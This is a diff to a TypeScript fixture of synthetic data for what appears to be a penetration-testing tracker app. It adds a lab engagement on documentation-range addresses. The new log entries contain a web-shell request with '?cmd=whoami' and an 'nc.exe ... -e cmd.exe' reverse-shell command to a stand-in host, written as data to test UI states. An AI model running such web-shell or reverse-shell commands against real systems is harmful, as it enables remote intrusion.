@@ -1,5 +1,5 @@
-// Synthetic stress data for audit mode. Nothing here is real: documentation-style names, 10.10.x.x
-// addresses and placeholder secrets only. Timestamps are relative to AUDIT_NOW so screenshots are stable.
+// Synthetic stress data for audit mode. Nothing here is real: documentation-style names, 10.10.x.x (RFC 5737
+// and example.test for the Payloads drill) addresses and placeholder secrets only. Timestamps are relative to AUDIT_NOW so screenshots are stable.
 import type { AccessGrant, CredAttempt, Credential, TriedPair, Username } from "../types/credentials";
 import type { ChecklistItem } from "../types/checklist";
 import type { CleanupItem } from "../types/cleanup";
@@ -23,6 +23,9 @@ export const AUDIT_IDS = {
   dcHost: "h-dc01",
   fileHost: "h-fs01",
   msfHost: "h-exam-ms01",
+  payloadsEngagement: "e-pay",
+  iisHost: "h-pay-iis",
+  pgHost: "h-pay-pg",
 } as const;
 
 /** 2026-11-05 14:00 UTC. The browser clock is frozen here when auditing. */
@@ -82,6 +85,14 @@ const engagements: Engagement[] = [
     timeboxStart: null, timeboxMinutes: null, status: "archived", createdAt: ago(45 * 24 * HOUR),
     updatedAt: ago(29 * 24 * HOUR), lastActivityAt: ago(30 * 24 * HOUR), lastRanOn: null, msfHostId: null,
   },
+  // Payloads: RFC 5737 addresses and example.test names only. Older than e-lab, so /arsenal and /payloads still
+  // default to e-lab when opened directly.
+  {
+    id: "e-pay", name: "Payloads drill", kind: "lab", client: null, subLabel: null,
+    scopeCidrs: ["198.51.100.0/24"], domain: "example.test", startsAt: null, endsAt: null,
+    timeboxStart: null, timeboxMinutes: null, status: "active", createdAt: ago(48 * HOUR), updatedAt: ago(24 * HOUR),
+    lastActivityAt: ago(24 * HOUR), lastRanOn: "Kali (VM)", msfHostId: null,
+  },
 ];
 
 // ---------------------------------------------------------------- hosts
@@ -106,6 +117,9 @@ const hosts: Host[] = [
   host("h-exam-ad02", "e-exam", "ad02", "10.10.30.11", "windows", { adSet: true, adSetEffective: true, boardColumn: "vulnerability-detection" }),
   host("h-exam-web", "e-exam", "web01", "10.10.30.20", "linux", { boardColumn: "privilege-escalation", access: "user" }),
   host("h-exam-lnx", "e-exam", "lnx02", "10.10.30.21", "linux"),
+  // A long name, so the drawer's host chip is at its widest next to "Paste into Web shell ?cmd=".
+  host("h-pay-iis", "e-pay", "intranet-gateway-iis-frontend-07.corp.example.test", "198.51.100.20", "windows", { boardColumn: "initial-foothold", access: "user" }),
+  host("h-pay-pg", "e-pay", "pg01.example.test", "198.51.100.30", "linux"),
   host("h-old-1", "e-old", "shop.contoso.example", "10.60.5.10", "linux", { boardColumn: "reporting", access: "root" }),
 ];
 
@@ -189,6 +203,10 @@ const services: Service[] = [
   svc("h-exam-web", 22, "ssh", "OpenSSH 8.2p1"),
   svc("h-exam-web", 80, "http", "Apache httpd 2.4.41", confirmed("Apache httpd", "2.4.41")),
   svc("h-exam-lnx", 22, "ssh", "OpenSSH 7.6p1"),
+  svc("h-pay-iis", 80, "http", "Microsoft IIS httpd 10.0", confirmed("IIS", "10.0")),
+  svc("h-pay-iis", 445, "microsoft-ds?", null),
+  svc("h-pay-pg", 22, "ssh", "OpenSSH 8.9p1 Ubuntu 3ubuntu0.6"),
+  svc("h-pay-pg", 5432, "postgresql", "PostgreSQL DB 14.10 - 14.11"),
   svc("h-old-1", 443, "ssl/http", "nginx 1.22.1"),
 ];
 
@@ -266,7 +284,21 @@ const examLog: LogEntry[] = [
   cmd("Web enumeration", "gobuster dir -u http://10.10.30.20 -w common.txt", "/admin (Status: 301)", ["h-exam-web"], { engagementId: "e-exam", at: ago(2 * HOUR) }),
 ].map((e, i) => ({ ...e, id: `l-exam-${i + 1}` }));
 
-const log: LogEntry[] = [...labLog, ...examLog];
+// The IIS host: a ?cmd= web shell that answers (so the paste context is "Web shell ?cmd="), then an nc.exe payload
+// logged from the drawer that failed there (so the misfit fold says "Failed here before").
+const payLog: LogEntry[] = [
+  cmd(
+    "Web shell answers", `curl "http://198.51.100.20/uploads/probe.aspx?cmd=whoami"`, "iis apppool\\defaultapppool", ["h-pay-iis"],
+    { engagementId: "e-pay", at: ago(26 * HOUR) },
+  ),
+  cmd(
+    "nc.exe -e · 198.51.100.20", "nc.exe 192.0.2.10 443 -e cmd.exe",
+    "'nc.exe' is not recognized as an internal or external command,\noperable program or batch file.", ["h-pay-iis"],
+    { engagementId: "e-pay", at: ago(25 * HOUR), payloadId: "nc-exe", payloadValues: { LHOST: "192.0.2.10", LPORT: "443" } },
+  ),
+].map((e, i) => ({ ...e, id: `l-pay-${i + 1}` }));
+
+const log: LogEntry[] = [...labLog, ...examLog, ...payLog];
 
 const attachments: Attachment[] = (Object.keys(AUDIT_PNGS) as (keyof typeof AUDIT_PNGS)[]).map((k) => ({
   id: `a-${k}`, mime: "image/png", dataBase64: AUDIT_PNGS[k].base64,
@@ -426,6 +458,7 @@ const progress: Record<string, Progress> = {
   "e-lab": { hostsTotal: 6, hostsRooted: 2, flagsFound: 2, flagsTotal: 12 },
   "e-exam": { hostsTotal: 5, hostsRooted: 0, flagsFound: 1, flagsTotal: 6 },
   "e-old": { hostsTotal: 1, hostsRooted: 1, flagsFound: 2, flagsTotal: 2 },
+  "e-pay": { hostsTotal: 2, hostsRooted: 0, flagsFound: 0, flagsTotal: 4 },
 };
 
 const backups: BackupInfo[] = [
